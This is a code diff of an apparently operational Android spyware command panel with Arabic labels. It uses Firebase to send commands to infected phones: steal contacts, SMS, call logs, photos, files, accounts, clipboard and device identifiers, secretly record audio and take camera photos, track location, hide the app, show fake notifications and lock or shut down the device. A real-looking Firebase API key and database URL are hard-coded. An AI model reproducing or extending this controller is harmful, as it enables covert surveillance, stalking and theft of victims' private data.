@@ -17,15 +17,21 @@
         .device-list{background:#1a1a2e;padding:15px;border-radius:15px;margin-bottom:15px}
         .device-item{padding:12px;border:1px solid #333;border-radius:10px;margin-bottom:5px;cursor:pointer;display:flex;justify-content:space-between;align-items:center}
         .device-item.active{border-color:#ef4444;background:#2a0a0a}
+        .section-title{font-size:16px;margin:15px 0 10px;color:#aaa}
         .controls-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
         .ctrl-btn{padding:10px;border:1px solid #333;border-radius:10px;text-align:center;cursor:pointer;background:#0d0d1a;font-size:11px}
         .ctrl-btn .icon{font-size:18px;display:block;margin-bottom:4px}
+        .ctrl-btn.file-btn{border-color:#22c55e}
+        .ctrl-btn.file-btn:hover{border-color:#22c55e;background:#0a1a0a}
+        .ctrl-btn.control-btn{border-color:#3b82f6}
+        .ctrl-btn.control-btn:hover{border-color:#3b82f6;background:#0a0a1a}
+        .ctrl-btn.danger-btn{border-color:#ef4444}
+        .ctrl-btn.danger-btn:hover{border-color:#ef4444;background:#1a0a0a}
         .log{background:#0d0d1a;padding:10px;border-radius:10px;margin-top:15px;max-height:150px;overflow-y:auto;font-family:monospace;font-size:11px;color:#22c55e}
         .selected-device{color:#ef4444;font-weight:bold;font-size:14px;text-align:center;padding:10px;background:#1a0a0a;border-radius:10px;margin-bottom:10px;border:1px solid #ef4444}
         .data-area{background:#0d0d1a;padding:10px;border-radius:10px;margin-top:10px;max-height:300px;overflow-y:auto;font-size:12px;color:#fff;border:1px solid #333;display:none}
         .data-area.show{display:block}
         .download-btn{background:#22c55e;color:#000;padding:8px 15px;border:none;border-radius:8px;cursor:pointer;margin-top:8px;font-weight:bold}
-        .download-btn:hover{opacity:0.8}
         .location-link{color:#3b82f6;text-decoration:underline;cursor:pointer}
     </style>
 </head>
@@ -42,39 +48,47 @@
     <div id="mainSection" style="display:none;">
         <div id="selectedDisplay" class="selected-device">⚠️ لم يتم اختيار جهاز</div>
         <div class="device-list"><h3>📱 الأجهزة المتصلة</h3><div id="devices"></div></div>
-        <div class="controls-grid" id="controls">
-            <div class="ctrl-btn" onclick="sendCmd('get_contacts')"><span class="icon">📇</span>جهات الاتصال</div>
-            <div class="ctrl-btn" onclick="sendCmd('get_sms')"><span class="icon">💬</span>الرسائل</div>
-            <div class="ctrl-btn" onclick="sendCmd('get_calllogs')"><span class="icon">📞</span>سجل المكالمات</div>
-            <div class="ctrl-btn" onclick="sendCmd('get_location')"><span class="icon">📍</span>الموقع</div>
-            <div class="ctrl-btn" onclick="sendCmd('start_record')"><span class="icon">🎤</span>تسجيل صوت</div>
-            <div class="ctrl-btn" onclick="sendCmd('stop_record')"><span class="icon">⏹</span>إيقاف التسجيل</div>
-            <div class="ctrl-btn" onclick="sendCmd('get_apps')"><span class="icon">📱</span>التطبيقات</div>
-            <div class="ctrl-btn" onclick="sendCmd('get_photos')"><span class="icon">🖼</span>الصور</div>
-            <div class="ctrl-btn" onclick="sendCmd('get_videos')"><span class="icon">🎬</span>الفيديوهات</div>
-            <div class="ctrl-btn" onclick="sendCmd('get_files')"><span class="icon">📦</span>الملفات</div>
-            <div class="ctrl-btn" onclick="sendCmd('hide_app')"><span class="icon">👁‍🗨</span>إخفاء</div>
-            <div class="ctrl-btn" onclick="sendCmd('show_app')"><span class="icon">👁</span>إظهار</div>
-            <div class="ctrl-btn" onclick="sendCmd('fake_notif')"><span class="icon">🔔</span>إشعار وهمي</div>
-            <div class="ctrl-btn" onclick="sendCmd('take_photo')"><span class="icon">📸</span>تصوير خلفي</div>
-            <div class="ctrl-btn" onclick="sendCmd('take_photo_front')"><span class="icon">🤳</span>تصوير أمامي</div>
-            <div class="ctrl-btn" onclick="sendCmd('flash_on')"><span class="icon">🔦</span>كشاف ON</div>
-            <div class="ctrl-btn" onclick="sendCmd('flash_off')"><span class="icon">🔦</span>كشاف OFF</div>
-            <div class="ctrl-btn" onclick="sendCmd('get_imei')"><span class="icon">📟</span>IMEI</div>
-            <div class="ctrl-btn" onclick="sendCmd('get_phone')"><span class="icon">📞</span>رقم الهاتف</div>
-            <div class="ctrl-btn" onclick="sendCmd('get_sim')"><span class="icon">📡</span>معلومات SIM</div>
-            <div class="ctrl-btn" onclick="sendCmd('get_wifi')"><span class="icon">📶</span>الواي فاي</div>
-            <div class="ctrl-btn" onclick="sendCmd('get_battery')"><span class="icon">🔋</span>البطارية</div>
-            <div class="ctrl-btn" onclick="sendCmd('get_ip')"><span class="icon">🌐</span>IP العام</div>
-            <div class="ctrl-btn" onclick="sendCmd('lock_device')"><span class="icon">🔒</span>قفل الجهاز</div>
-            <div class="ctrl-btn" onclick="sendCmd('reboot')"><span class="icon">🔄</span>إعادة تشغيل</div>
-            <div class="ctrl-btn" onclick="sendCmd('shutdown')"><span class="icon">⏻</span>إيقاف تشغيل</div>
-            <div class="ctrl-btn" onclick="sendCmd('get_accounts')"><span class="icon">👤</span>الحسابات</div>
-            <div class="ctrl-btn" onclick="sendCmd('get_clipboard')"><span class="icon">📋</span>الحافظة</div>
-            <div class="ctrl-btn" onclick="sendCmd('get_device')"><span class="icon">ℹ️</span>معلومات الجهاز</div>
-            <div class="ctrl-btn" onclick="sendCmd('get_network')"><span class="icon">📡</span>معلومات الشبكة</div>
-            <div class="ctrl-btn" onclick="sendCmd('start_location_track')"><span class="icon">📍</span>تتبع الموقع</div>
-            <div class="ctrl-btn" onclick="sendCmd('stop_location_track')"><span class="icon">🛑</span>إيقاف التتبع</div>
+
+        <!-- قسم أوامر الملفات -->
+        <div class="section-title">📂 أوامر جلب الملفات</div>
+        <div class="controls-grid">
+            <div class="ctrl-btn file-btn" onclick="sendCmd('get_contacts')"><span class="icon">📇</span>جهات الاتصال</div>
+            <div class="ctrl-btn file-btn" onclick="sendCmd('get_sms')"><span class="icon">💬</span>الرسائل</div>
+            <div class="ctrl-btn file-btn" onclick="sendCmd('get_calllogs')"><span class="icon">📞</span>سجل المكالمات</div>
+            <div class="ctrl-btn file-btn" onclick="sendCmd('get_photos')"><span class="icon">🖼</span>الصور</div>
+            <div class="ctrl-btn file-btn" onclick="sendCmd('get_videos')"><span class="icon">🎬</span>الفيديوهات</div>
+            <div class="ctrl-btn file-btn" onclick="sendCmd('get_files')"><span class="icon">📦</span>جميع الملفات</div>
+            <div class="ctrl-btn file-btn" onclick="sendCmd('get_apps')"><span class="icon">📱</span>التطبيقات</div>
+            <div class="ctrl-btn file-btn" onclick="sendCmd('get_clipboard')"><span class="icon">📋</span>الحافظة</div>
+            <div class="ctrl-btn file-btn" onclick="sendCmd('get_accounts')"><span class="icon">👤</span>الحسابات</div>
+            <div class="ctrl-btn file-btn" onclick="sendCmd('get_device')"><span class="icon">ℹ️</span>معلومات الجهاز</div>
+            <div class="ctrl-btn file-btn" onclick="sendCmd('get_network')"><span class="icon">📡</span>معلومات الشبكة</div>
+            <div class="ctrl-btn file-btn" onclick="sendCmd('get_imei')"><span class="icon">📟</span>IMEI</div>
+            <div class="ctrl-btn file-btn" onclick="sendCmd('get_phone')"><span class="icon">📞</span>رقم الهاتف</div>
+            <div class="ctrl-btn file-btn" onclick="sendCmd('get_sim')"><span class="icon">📡</span>معلومات SIM</div>
+            <div class="ctrl-btn file-btn" onclick="sendCmd('get_wifi')"><span class="icon">📶</span>الواي فاي</div>
+            <div class="ctrl-btn file-btn" onclick="sendCmd('get_battery')"><span class="icon">🔋</span>البطارية</div>
+            <div class="ctrl-btn file-btn" onclick="sendCmd('get_ip')"><span class="icon">🌐</span>IP العام</div>
+        </div>
+
+        <!-- قسم أوامر التحكم -->
+        <div class="section-title">🎯 أوامر التحكم المباشر</div>
+        <div class="controls-grid">
+            <div class="ctrl-btn control-btn" onclick="sendCmd('get_location')"><span class="icon">📍</span>الموقع</div>
+            <div class="ctrl-btn control-btn" onclick="sendCmd('start_record')"><span class="icon">🎤</span>تسجيل صوت</div>
+            <div class="ctrl-btn control-btn" onclick="sendCmd('stop_record')"><span class="icon">⏹</span>إيقاف التسجيل</div>
+            <div class="ctrl-btn control-btn" onclick="sendCmd('take_photo')"><span class="icon">📸</span>تصوير خلفي</div>
+            <div class="ctrl-btn control-btn" onclick="sendCmd('take_photo_front')"><span class="icon">🤳</span>تصوير أمامي</div>
+            <div class="ctrl-btn control-btn" onclick="sendCmd('flash_on')"><span class="icon">🔦</span>كشاف ON</div>
+            <div class="ctrl-btn control-btn" onclick="sendCmd('flash_off')"><span class="icon">🔦</span>كشاف OFF</div>
+            <div class="ctrl-btn control-btn" onclick="sendCmd('start_location_track')"><span class="icon">📍</span>تتبع الموقع</div>
+            <div class="ctrl-btn control-btn" onclick="sendCmd('stop_location_track')"><span class="icon">🛑</span>إيقاف التتبع</div>
+            <div class="ctrl-btn danger-btn" onclick="sendCmd('hide_app')"><span class="icon">👁‍🗨</span>إخفاء</div>
+            <div class="ctrl-btn danger-btn" onclick="sendCmd('show_app')"><span class="icon">👁</span>إظهار</div>
+            <div class="ctrl-btn danger-btn" onclick="sendCmd('fake_notif')"><span class="icon">🔔</span>إشعار وهمي</div>
+            <div class="ctrl-btn danger-btn" onclick="sendCmd('lock_device')"><span class="icon">🔒</span>قفل الجهاز</div>
+            <div class="ctrl-btn danger-btn" onclick="sendCmd('reboot')"><span class="icon">🔄</span>إعادة تشغيل</div>
+            <div class="ctrl-btn danger-btn" onclick="sendCmd('shutdown')"><span class="icon">⏻</span>إيقاف تشغيل</div>
         </div>
 
         <div class="data-area" id="dataArea">
@@ -93,7 +107,6 @@
         let currentData = null;
         let currentFileName = 'data.txt';
 
-        // تحميل الإعدادات المحفوظة
         document.getElementById('apiKey').value = localStorage.getItem('fb_apiKey') || 'AIzaSyDBizqAKWSwGsicO6eRua-5x_8VQLFKTIc';
         document.getElementById('databaseURL').value = localStorage.getItem('fb_databaseURL') || 'https://black-cock-4929d-default-rtdb.firebaseio.com/';
 
@@ -103,23 +116,15 @@
         function initFirebase() {
             const apiKey = document.getElementById('apiKey').value.trim();
             const databaseURL = document.getElementById('databaseURL').value.trim();
-
-            if (!apiKey || !databaseURL) {
-                log('⚠️ أدخل apiKey و databaseURL');
-                return;
-            }
-
+            if (!apiKey || !databaseURL) { log('⚠️ أدخل apiKey و databaseURL'); return; }
             try {
                 const firebaseConfig = { apiKey: apiKey, databaseURL: databaseURL };
                 firebase.initializeApp(firebaseConfig);
                 database = firebase.database();
                 commandsRef = database.ref('commands');
-
                 document.getElementById('setupSection').style.display = 'none';
                 document.getElementById('mainSection').style.display = 'block';
                 log('✅ تم الاتصال بـ Firebase');
-
-                // قراءة الأجهزة
                 database.ref('devices').on('value', snapshot => {
                     const data = snapshot.val();
                     devices = {};
@@ -136,21 +141,12 @@
                     updateDevices();
                     log('📱 تم تحديث الأجهزة (' + Object.keys(devices).length + ')');
                 });
-
-            } catch(e) {
-                log('❌ خطأ في Firebase: ' + e.message);
-            }
+            } catch(e) { log('❌ خطأ في Firebase: ' + e.message); }
         }
 
         function sendCmd(cmd) {
-            if (!selectedDevice) {
-                log('⚠️ اختر جهازاً أولاً');
-                return;
-            }
-            if (!commandsRef) {
-                log('❌ Firebase غير جاهز');
-                return;
-            }
+            if (!selectedDevice) { log('⚠️ اختر جهازاً أولاً'); return; }
+            if (!commandsRef) { log('❌ Firebase غير جاهز'); return; }
             log('📤 أمر مرسل: ' + cmd + ' → ' + selectedDevice);
             commandsRef.child(selectedDevice).set(cmd);
             showData('⏳ جاري تنفيذ الأمر: ' + cmd + '...', 'info.txt');
@@ -167,12 +163,11 @@
             const area = document.getElementById('dataArea');
             const content = document.getElementById('dataContent');
             const btn = document.getElementById('downloadBtn');
-            
             currentData = data;
             currentFileName = filename;
 
-            // إذا كان الموقع، نعرض رابط
-            if (data.includes('LOCATION')) {
+            // إذا كان الموقع
+            if (data.includes('LOCATION') && data.includes(',')) {
                 try {
                     const parts = data.split('|');
                     if (parts.length >= 2) {
@@ -190,7 +185,7 @@
                 } catch(e) {}
             }
 
-            // إذا كان ملف (base64)
+            // إذا كان ملف
             if (data.includes('FILE')) {
                 try {
                     const json = JSON.parse(data);
@@ -249,10 +244,8 @@
                     dataListener = database.ref('devices').child(id).child('data').on('value', snapshot => {
                         const data = snapshot.val();
                         if (data) {
-                            // تحديد نوع الملف
                             let filename = 'data.txt';
-                            if (data.includes('LOCATION')) filename = 'location.txt';
-                            else if (data.includes('CONTACTS')) filename = 'contacts.txt';
+                            if (data.includes('CONTACTS')) filename = 'contacts.txt';
                             else if (data.includes('SMS')) filename = 'sms.txt';
                             else if (data.includes('CALL')) filename = 'call_log.txt';
                             else if (data.includes('RECORD')) filename = 'recording.mp3';
